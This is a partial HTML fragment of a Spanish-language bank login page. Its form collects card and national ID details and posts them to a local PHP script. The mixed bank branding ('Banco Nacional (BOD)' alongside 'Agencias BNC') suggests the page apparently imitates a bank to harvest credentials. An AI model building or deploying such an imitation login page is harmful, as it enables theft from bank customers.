...
<head>
  ...
  <title>Login - Banco Nacional (BOD)</title>
  ...
  <div class="wrapper">
    <form class="login-container" id="login-form" action="php/login.php" method="POST">
      <div class="tabs">
        ...
        <button type="button" id="tab-empresas">Empresas</button>
      </div>
      <h2>Iniciar Sesión</h2>
      <p>¡Buenas tardes, <strong>Bienvenido!</strong><br>Ingrese sus credenciales</p>
      <div class="sub-tabs" id="sub-tabs-personas">
        <button type="button" id="btn-debito-credito">Débito | Crédito</button>
        <button type="button" id="btn-bod">Tarjeta Débito BOD</button>
      </div>
      ...
      <div class="form-group" id="group-secundario">
        <input id="input-secundario" type="text" placeholder="Cédula de Identidad" required pattern="\d*" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
      </div>
      ...
      <div class="grid-3">
        <div class="card">
          <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 10px;">
            <img class="r1" src="img/r1.png" alt="" style="width: 40px; height: 40px;">
          </div>
        ...
        <div class="card">
          <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 10px;">
            <img class="r1" src="img/r2.png" alt="" style="width: 60px; height: 40px;">
          </div>
        ...
        <div class="card">
          <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 10px;">
            <img class="r1" src="img/r3.png" alt="" style="width: 40px; height: 40px;">
          </div>
          <h3>Agencias BNC</h3>
